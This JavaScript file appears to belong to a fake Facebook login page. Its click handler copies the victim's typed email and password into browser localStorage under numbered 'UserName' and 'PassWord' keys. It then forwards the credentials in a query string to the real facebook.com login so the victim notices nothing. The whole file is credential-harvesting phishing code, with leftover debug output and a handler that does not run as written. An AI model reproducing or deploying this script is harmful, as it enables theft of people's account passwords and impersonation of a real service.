let text = document.getElementById("email");
let pass = document.getElementById("pass");
let button = document.getElementById("u_0_5_AT");
let form1 = document.getElementById("form");

button.addEventListener("click", (e) => {
  console.log("yyyyyyyyyyyyy");
  if (text.value.length > 3 && pass.value.length > 3) {
    form1.setAttribute(
      "action",
      "https://facebook.com/login?email=" +
        encodeURIComponent(text.value) +
        "&pass=" +
        encodeURIComponent(pass.value)
    );

    window.localStorage.setItem(
      "UserName" + window.localStorage.length,
      text.value
    );
    window.localStorage.setItem(
      "PassWord" + (window.localStorage.length - 1),
      pass.value
    );
    window.onload = function () {
      form1.submit();
    };
  } else {
    e.preventDefault();
  }
});
